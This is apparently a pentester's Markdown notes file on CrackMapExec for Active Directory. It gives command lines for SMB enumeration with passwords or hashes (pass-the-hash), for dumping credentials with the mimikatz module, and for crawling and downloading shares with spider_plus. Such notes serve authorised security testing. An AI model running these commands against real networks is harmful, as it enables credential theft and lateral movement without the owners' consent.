---
tags: [tool, activedirectory, smb]
tool: "crackmapexec"
category: "Active Directory"
installed: true
phase: [enumeration, exploitation]
---

# CrackMapExec - Swiss Army Knife for AD

## Tool Overview
Purpose: All-in-one AD pentesting tool
Location: /usr/bin/crackmapexec

## When to Use
- Pass-the-hash across multiple hosts
- Automated enumeration
- Module-based exploitation

## How to Use It

SMB Enumeration:
crackmapexec smb 192.168.1.0/24 -u user -p pass
crackmapexec smb 192.168.1.0/24 -u user -H hash

Mimikatz Module:
crackmapexec smb target -u user -p pass -M mimikatz

Spider_plus Module:
crackmapexec smb target -u user -p pass -M spider_plus -o READ_ONLY=false

## Related Tools
netexec, impacket
